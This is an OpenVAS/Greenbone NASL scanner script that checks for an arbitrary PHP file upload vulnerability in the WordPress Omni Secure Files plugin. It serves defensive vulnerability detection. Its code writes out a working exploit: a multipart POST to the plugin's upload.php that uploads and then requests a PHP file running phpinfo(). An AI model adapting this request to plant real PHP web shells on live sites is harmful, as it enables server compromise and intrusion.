# SPDX-FileCopyrightText: 2012 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:wordpress:wordpress";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802641");
  script_version("2023-07-25T05:05:58+0000");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"2023-07-25 05:05:58 +0000 (Tue, 25 Jul 2023)");
  script_tag(name:"creation_date", value:"2012-06-12 12:12:12 +0530 (Tue, 12 Jun 2012)");
  script_name("WordPress Omni Secure Files Plugin 'upload.php' Arbitrary File Upload Vulnerability");
  script_xref(name:"URL", value:"http://secunia.com/advisories/49441");
  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/76121");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/19009");
  script_xref(name:"URL", value:"http://packetstormsecurity.org/files/113411/wpomnisecure-shell.txt");

  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_copyright("Copyright (C) 2012 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_wordpress_http_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("wordpress/http/detected");

  script_tag(name:"impact", value:"Successful exploitation will allow attacker to upload arbitrary PHP
code and run it in the context of the Web server process.");
  script_tag(name:"affected", value:"WordPress Omni Secure Files Plugin version 0.1.13");
  script_tag(name:"insight", value:"The flaw is due to the wp-content/plugins/omni-secure-files/plupload/
examples/upload.php script improperly verifying uploaded files. This can be
exploited to execute arbitrary PHP code by uploading a malicious PHP script.");
  script_tag(name:"solution", value:"No known solution was made available for at least one year
since the disclosure of this vulnerability. Likely none will be provided anymore.
General solution options are to upgrade to a newer release, disable respective
features, remove the product or replace the product by another one.");
  script_tag(name:"summary", value:"WordPress Omni Secure Files Plugin is prone to file upload vulnerability.");

  script_tag(name:"solution_type", value:"WillNotFix");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if(!port = get_app_port(cpe:CPE, service:"www"))
  exit(0);

if(!dir = get_app_location(cpe:CPE, port:port))
  exit(0);

if(dir == "/")
  dir = "";

url = dir + "/wp-content/plugins/omni-secure-files/plupload/examples/upload.php";

useragent = http_get_user_agent();

# nb: http_host_name() should be always after the static string(s) above but always after any
# dynamically ones (e.g. a random string) which should be different for each hostname.
host = http_host_name(port:port);

rand = rand();
file =  "ovtest" + rand + ".php";
ex = "<?php echo " + rand + "; phpinfo(); die; ?>";
len = strlen(ex) + 328;

req = string(
      "POST ", url, " HTTP/1.1\r\n",
      "Host: ", host, "\r\n",
      "User-Agent: ", useragent, "\r\n",
      "Content-Type: multipart/form-data; boundary=----------------------------b5d63781e685\r\n",
      "Content-Length: ", len, "\r\n\r\n",
      "------------------------------b5d63781e685\r\n",
      'Content-Disposition: form-data; name="file"; filename="',file,'";',"\r\n",
      "Content-Type: application/octet-stream\r\n",
      "\r\n",
      ex, "\r\n",
      "------------------------------b5d63781e685\r\n",
      'Content-Disposition: form-data; name="name"',"\r\n",
      "\r\n",
      file, "\r\n",
      "------------------------------b5d63781e685--\r\n\r\n");
res = http_keepalive_send_recv(port: port, data: req);

if(res && res =~ "^HTTP/1\.[01] 200") {
  url = string(dir, "/wp-content/plugins/omni-secure-files/plupload/",
               "examples/uploads/", file);

  if(http_vuln_check(port:port, url:url, check_header:TRUE,
     pattern:"<title>phpinfo\(\)", extra_check:rand)) {
    report = http_report_vuln_url(port:port, url:url);
    security_message(port:port, data:report);
    exit(0);
  }
  exit(99);
}

exit(0);
